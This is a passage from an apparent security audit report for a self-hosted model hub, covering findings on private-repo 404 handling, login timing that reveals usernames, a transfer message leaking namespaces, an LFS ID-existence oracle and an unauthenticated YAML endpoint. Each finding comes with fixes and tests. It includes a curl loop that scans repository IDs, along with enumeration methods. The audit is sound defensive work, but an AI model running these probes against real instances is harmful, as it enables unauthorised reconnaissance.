     `lib/i18n/dictionaries/{en,ja}/common.ts` as `ui.unexpectedError.*`.
  2. Also add `frontend/app/global-error.tsx` (the last line of defense if `layout.tsx` itself
     crashes; it must render its own `<html><body>`).
  3. Add `error.tsx` under the repository routes too
     (`app/datasets/[ns]/[name]/`, `app/models/[ns]/[name]/`), so errors can be shown while
     keeping the repository header.
  4. Add `loading.tsx` (showing `Skeleton`) to the main data-fetching routes (`app/datasets/`,
     `app/models/`, `app/experiments/`, and each tab under the repository routes) — currently
     `dynamic = "force-dynamic"` means there's an unresponsive gap during navigation.
- **How to verify**: manually confirm via a dev-only route that deliberately throws. Confirm
  `bun run build` succeeds (`global-error.tsx` carries special constraints).

---

### [S15] (Severity: Medium) Private repositories and being logged out both collapse into a blanket `notFound()`, with no path toward signing in

- **Location**:
  - `frontend/components/repo-pages/repo-overview.tsx:40`, `repo-tree.tsx:45`, `repo-blob.tsx:54`,
    `repo-commits.tsx:55`, `repo-viewer.tsx:42`, `repo-edit.tsx:43`, `repo-settings.tsx:35`
    (all doing `if (isNotFound(result)) notFound()`)
  - `frontend/app/not-found.tsx` (has a "sign in" link, but it doesn't carry `?next=`)
- **Problem**: the backend is designed to return 404 in order to hide the existence of private
  repositories (`auth.go:204-207` — this behavior itself is correct). But the frontend collapses
  every 404 into the generic not-found page, so **a user who actually does have access, but
  happens to be logged out in the browser**, is simply told "doesn't exist" and hits a dead end.
  This is the typical experience when clicking a shared private-repository URL.
- **Attack scenario / repro steps**: open a private repository's URL while logged out ->
  a "Not found" page. Clicking the sign-in link goes to `/login`, and after logging in you're not
  returned to the original URL (no `?next=`), forcing you to retype it.
- **Suggested fix**:
  1. Since `app/not-found.tsx` can't access the current request URL, stop calling `notFound()`
     from the repository routes and add a dedicated branch instead.
     - Also call `lib/session.ts`'s `getCurrentUser()`; when **logged out AND 404**, return an
       `ErrorState` (title: "Not found or you don't have access", action:
       `<Link href={"/login?next=" + encodeURIComponent(currentPath)}>`). Standardize the wording
       as "not found, or you don't have access" so it never implies the repository's existence.
     - When **logged in AND 404**, keep calling `notFound()` as before.
  2. Each `RepoXxx` component already receives `kind`/`ns`/`name`/`rev`/`path`, so the current
     path can be reconstructed via a helper in `lib/paths.ts` (no need for `headers()`).
  3. Give `app/not-found.tsx`'s sign-in link a `?next=/`-equivalent fallback too.
  4. Add the frontend's display policy (wording that doesn't hint at existence, plus a sign-in
     path) alongside `docs/api-contract.md`'s note that "private repos are 404-equivalent."
- **How to verify**: open every tab (overview / tree / blob / commits / viewer / settings) of a
  private repository while logged out and confirm they all show the same wording plus a sign-in
  link carrying `?next=`. Confirm the usual not-found page still appears for a nonexistent
  repository while logged in.

---

### [S16] (Severity: Low) Login timing differences let an attacker enumerate usernames

- **Location**: `backend/internal/api/auth.go:291-295`
- **Problem**: when `GetUserByUsername` fails, `CheckPassword` (bcrypt, tens of ms) is never
  called, and a 401 returns immediately. Only responses for existing usernames are noticeably
  slower. Response body and status code are identical, so the only difference is timing.
- **Attack scenario / repro steps**: POST each candidate username one at a time and flag any
  response taking > 30ms as "exists." Enumeration then feeds into the brute-force attack in [S2].
- **Suggested fix**: run `auth.CheckPassword` against a dummy bcrypt hash even when the user
  isn't found, before returning 401 (keep `var dummyHash = <a bcrypt hash generated at startup>`
  in the `auth` package). Once [S2]'s rate limiting is in place, the real-world impact is nearly
  gone, so this can wait until after S2.
- **How to verify**: `internal/api` test confirming the `CheckPassword` equivalent gets called for
  both existing and non-existing usernames (a fake call counter).

---

### [S17] (Severity: Low) A transfer's 403 message leaks the destination namespace

- **Location**: `backend/internal/api/transfers.go:344-357` (`handleDecideTransfer`)
- **Problem**: `GetRepoTransfer(id)` runs **before** the permission check, and when the caller
  lacks permission, returns
  `forbidden(w, "you do not have write access to "+t.ToNamespace)`. Brute-forcing the numeric ID
  lets an attacker enumerate the destination namespace of any pending transfer. It also reveals
  "transfer #N exists" via the difference from a 404.
- **Attack scenario / repro steps**: any authenticated user hits
  `POST /api/v1/transfers/1/reject` through `/transfers/1000/reject` in sequence and collects
  destination org names from the 403 response bodies.
- **Suggested fix**: return `notFound(w, "transfer not found")` when the caller lacks permission,
  making it indistinguishable from a nonexistent ID (the same policy `loadRepoForRead` already
  uses for private repositories). Don't include the destination namespace name in the message.
- **How to verify**: add a test to `internal/api/transfers_test.go` confirming that a user without
  write access to the destination gets a 404 when calling accept/reject.

---

### [S18] (Severity: Low) The LFS proxy path acts as a repository-ID existence oracle

- **Location**: `backend/internal/api/git.go:169-182` (`handleLFSProxyUpload`),
  `git.go:266-280` (`handleLFSVerifyByID`)
- **Problem**: since `GetRepoByID` is called first, a nonexistent ID gets a 404 via
  `handleStoreError`, while an existing-but-inaccessible private repository gets a 401. Scanning
  numeric IDs reveals "a repository with ID N exists on this instance" — leaking the operational
  detail of repository count (though not the name).
- **Attack scenario / repro steps**:
  `for i in $(seq 1 1000); do curl -o /dev/null -w "$i %{http_code}\n" -X PUT
  "http://host/api/v1/lfs/$i/$(printf 'a%.0s' {1..64})?op=upload"; done`, tallying 401 vs 404.
- **Suggested fix**: when neither signature verification nor `canWrite` passes, unify the
  response to `notFound(w, "object not found")` regardless of whether the repository exists
  (`handleLFSProxyDownload:236-239` already does this — align with it).
- **How to verify**: a test confirming that unprivileged requests return the same status and body
  for both an existing and a nonexistent repository ID.

---

### [S19] (Severity: Low) `POST /api/validate-yaml` accepts 4MB of YAML without authentication

- **Location**: `backend/internal/api/hfcompat.go:16-38`, `backend/internal/api/server.go:148`
- **Problem**: there's no auth check (intentional, since `huggingface_hub` always calls this
  before a commit), and `maxYAMLBody` is 4MB. `yaml.Unmarshal` becomes a CPU/memory sink that
  anyone can trigger without authentication. `gopkg.in/yaml.v3` caps alias expansion, so a
  "billion laughs" attack doesn't work, but sending deeply nested 4MB YAML documents in parallel
  can still apply load.
- **Attack scenario / repro steps**: POST deeply nested 4MB YAML documents in parallel.
- **Suggested fix**:
  1. Add `requireUser` (since `huggingface_hub` calls this right before a commit, the caller is
     always authenticated by then; verify no regression via `make test-e2e`). If auth can't be
     required, at minimum include this endpoint under [S2]'s rate limiting.
  2. Lower `maxYAMLBody` from 4MB to around 1MB (plenty for a README's frontmatter).
- **How to verify**: confirm `make test-e2e`'s `create_commit` (including one with a README)
  still passes. Confirm unauthenticated `/api/validate-yaml` returns 401.

---

## Notes: items not checked this round / better suited to a separate task

- **Whether `repo_transfers`' expiration is actually enforced** (whether
  `store.AcceptRepoTransfer` checks `expires_at`) is **unverified** — `internal/store/transfers.go`
  wasn't read in full.
- **`internal/sshserver`**'s SSH protocol layer (concurrent connection cap, auth attempt limits,
  whether `SSHIdleTimeout` is actually effective) was **out of scope** for this reading pass and
  is **unverified**. Only `api/gitssh.go`'s authorization logic was checked.
- **Resource limits within `internal/syncer` / `internal/wal` job processing** (files per push,
  export size) are **unverified**.
- **Accessibility**: confirmed that `Alert` / `ErrorState`'s live regions and `Dialog`'s focus
  trap (native `<dialog>` plus proper `close()` handling on unmount) are appropriate.
  `DataTable` (the virtualized grid)'s keyboard operation and `uPlot` chart's alternative
  representation are **unverified**.
